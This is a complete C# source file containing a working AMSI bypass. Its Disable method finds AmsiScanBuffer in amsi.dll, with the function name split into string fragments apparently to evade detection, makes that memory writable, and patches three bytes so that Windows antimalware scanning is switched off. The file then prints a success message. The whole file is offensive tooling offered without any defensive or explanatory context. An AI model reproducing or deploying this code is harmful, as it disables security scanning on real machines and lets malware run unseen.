using System;
using System.Runtime.InteropServices;

namespace BP
{
    public class AMS
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);


        public static void Disable()
        {
            IntPtr AMSDLL = LoadLibrary("amsi.dll");
            IntPtr AMSBPtr = GetProcAddress(AMSDLL, "Am" + "si" + "Scan" + "Buffer");
            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
            VirtualProtect(AMSBPtr, dwSize, 0x40, out Zero);
            Byte[] Patch1 = { 0x31 };
            Byte[] Patch2 = { 0xff };
            Byte[] Patch3 = { 0x90 };
            IntPtr unmanagedPointer1 = Marshal.AllocHGlobal(1);
            Marshal.Copy(Patch1, 0, unmanagedPointer1, 1);
            MoveMemory(AMSBPtr + 0x001b, unmanagedPointer1, 1);
            IntPtr unmanagedPointer2 = Marshal.AllocHGlobal(1);
            Marshal.Copy(Patch2, 0, unmanagedPointer2, 1);
            MoveMemory(AMSBPtr + 0x001c, unmanagedPointer2, 1);
            IntPtr unmanagedPointer3 = Marshal.AllocHGlobal(1);
            Marshal.Copy(Patch3, 0, unmanagedPointer3, 1);
            MoveMemory(AMSBPtr + 0x001d, unmanagedPointer3, 1);
            Console.WriteLine("Memory patched successfuly.");
        }
    }
}